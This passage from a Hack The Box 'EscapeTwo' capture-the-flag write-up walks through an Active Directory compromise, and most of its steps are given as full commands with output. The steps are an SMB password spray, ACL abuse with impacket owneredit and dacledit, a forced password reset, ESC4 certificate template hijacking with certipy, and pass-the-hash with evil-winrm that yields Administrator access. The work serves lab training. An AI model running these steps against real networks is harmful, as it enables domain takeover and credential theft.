SMB         10.129.7.30     445    DC01             [-] sequel.htb\kevin:Md9Wlq<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\sa:Md9Wlq<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\ryan:Md9Wlq<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\Administrator:Md9Wlq<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\:Md9Wlq<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\angela:MSS<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\kevin:MSS<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\sa:MSS<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\ryan:MSS<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\Administrator:MSS<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\:MSS<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\angela:WqSZAF<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\kevin:WqSZAF<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\sa:WqSZAF<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [+] sequel.htb\ryan:WqSZAF<REDACTED>
SMB         10.129.7.30     445    DC01             [-] sequel.htb\Administrator:WqSZAF<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\:WqSZAF<REDACTED> STATUS_LOGON_FAILURE
```

Ryan got a hit.

Let’s see if this user can `winrm`:

```bash
$ netexec winrm sequel.htb -u ryan -p WqSZAF<REDACTED>
WINRM       10.129.7.30     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
WINRM       10.129.7.30     5985   DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)
```

Nice, it can.

Let’s use `evil-winrm` to log into the DC as Ryan where `user.txt` will be awaiting:

```bash
$ evil-winrm -i sequel.htb -u ryan -p WqSZAF<REDACTED>

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\ryan\Desktop> ls

    Directory: C:\Users\ryan\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/15/2025   2:42 AM             34 user.txt

*Evil-WinRM* PS C:\Users\ryan\Desktop> cat user.txt
ee2aea<REDACTED>
```

### Exploiting Ca_svc

Let’s map out the domain with `bloodhound`.

Let’s collect data for `bloodhound` using `bloodhound-ce-python`:

```bash
$ bloodhound-ce-python -d sequel.htb -u rose -p 'KxEPkKe6R8su' -ns 10.129.7.30 -c all --zip
<SNIP>
```

Now let’s run `bloodhound` and import the collected data into it, then let’s check what can our exploited users do:

![Figure 4](/assets/images/writeups/hack-the-box-escapetwo/hack-the-box-escapetwo-fig-5.png)

<figcaption class="blog-image-caption">Figure 4</figcaption>

That’s too messy, but one thing stands out:

![Figure 5](/assets/images/writeups/hack-the-box-escapetwo/hack-the-box-escapetwo-fig-6.png)

<figcaption class="blog-image-caption">Figure 5</figcaption>

Ryan has WriteOwner permission over Ca_svc.

Let’s abuse this permission to change the owner of the Ca_svc to become Ryan, and give Ryan GenericAll permission over Ca_svc to change its password.

First, let’s change the owner using `impacket-owneredit`:

```bash
$ impacket-owneredit -action write -new-owner 'Ryan' -target 'ca_svc' sequel.htb/ryan:WqSZAF<REDACTED>
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Current owner information below
[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
[*] OwnerSid modified successfully!
```

Now let’s add GenericAll permission to Ryan over Ca_svc using `impacket-dacledit`:

```bash
$ impacket-dacledit -action 'write' -rights 'FullControl' -principal 'Ryan' -target 'ca_svc' sequel.htb/ryan:WqSZAF<REDACTED>
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] DACL backed up to dacledit-20251115-172541.bak
[*] DACL modified successfully!
```

Finally, let’s change the password of Ca_svc using `pth-net`:

```bash
$ pth-net rpc password ca_svc 'casvc123!' -U sequel.htb/ryan%WqSZAF<REDACTED> -S 10.129.7.30
E_md4hash wrapper called.
```

And let’s verify that the change was successful:

```bash
$ netexec smb sequel.htb -u ca_svc -p 'casvc123!'
SMB         10.129.7.30     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.7.30     445    DC01             [+] sequel.htb\ca_svc:casvc123!
```

Nice.

### ESC4

Since Ca_svc is likely the certificate authority user, let’s check for certificate templates and any vulnerabilities in them, using `certipy-ad`:

```bash
$ certipy-ad find -target sequel.htb -u ca_svc -p 'casvc123!' -vulnerable -enabled -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

<SNIP>
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC01-CA
    DNS Name                            : DC01.sequel.htb
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
    Certificate Validity End            : 2124-06-08 17:00:40+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireCommonName
    Enrollment Flag                     : PublishToDs
                                          AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-11-15T14:19:28+00:00
    Template Last Modified              : 2025-11-15T14:19:28+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Cert Publishers
        Write Property Enroll           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
    [+] User Enrollable Principals      : SEQUEL.HTB\Cert Publishers
    [+] User ACL Principals             : SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.
```

The DunderMifflinAuthentication template is vulnerable to ESC4.

ESC4 is described [by the author of `certipy-ad`](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc4-template-hijacking) as:

> ESC4, or Template Hijacking, occurs when an attacker gains permissions to modify a certificate template object stored in Active Directory. Certificate templates are AD objects residing in the Configuration Naming Context (under CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=...) and are protected by ACLs. If an attacker obtains Write access - such as WriteDACL (to change permissions), WriteOwner (to take ownership and then change permissions), specific WriteProperty rights on critical attributes, or FullControl - over a template object, they can alter its configuration. This modification can turn a previously secure template into one vulnerable to other attack scenarios, most commonly ESC1 (Enrollee-Supplied Subject for Client Authentication) or ESC2 (Any Purpose Certificate).
> 

Let’s exploit this vulnerability to dump the Administrator’s hash.

First, I’ll modify the template into a vulnerable state:

```bash
$ certipy-ad template \
    -u 'ca_svc@sequel.htb' -p 'casvc123!' \
    -dc-ip '10.129.7.30' -template 'DunderMifflinAuthentication' \
    -write-default-configuration -no-pass
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Saving current configuration to 'DunderMifflinAuthentication.json'
File 'DunderMifflinAuthentication.json' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote current configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Name-Flag: 1
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'DunderMifflinAuthentication'? (y/N): y
[*] Successfully updated 'DunderMifflinAuthentication'
```

Next, I’ll request a certificate using the modified template and supply the Administrator’s UPN:

```bash
$ certipy-ad req \
    -u 'ca_svc@sequel.htb' -p 'casvc123!' \
    -ca 'sequel-DC01-CA' -template 'DunderMifflinAuthentication' \
    -upn 'administrator@sequel.htb'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: SEQUEL.HTB.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 10
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Finally, I’ll authenticate using the obtained certificate:

```bash
$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.7.30
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@sequel.htb'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e<REDACTED>
```

> **Note:** If you got an error related to time and skew, check out [this article](https://medium.com/@cider-htb/when-your-vm-lies-about-the-time-fixing-clock-skew-errors-within-ctfs-and-active-directory-5698b9493a37).

### RCE as Administrator

Nice. Now with the Administrator’s hash in hand, let’s use `evil-winrm` to gain RCE as admin and grab the `root.txt` flag:

```bash
$ evil-winrm -i sequel.htb -u Administrator -H 7a8d4e<REDACTED>

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/15/2025   2:42 AM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
9bfd9a<REDACTED>
```
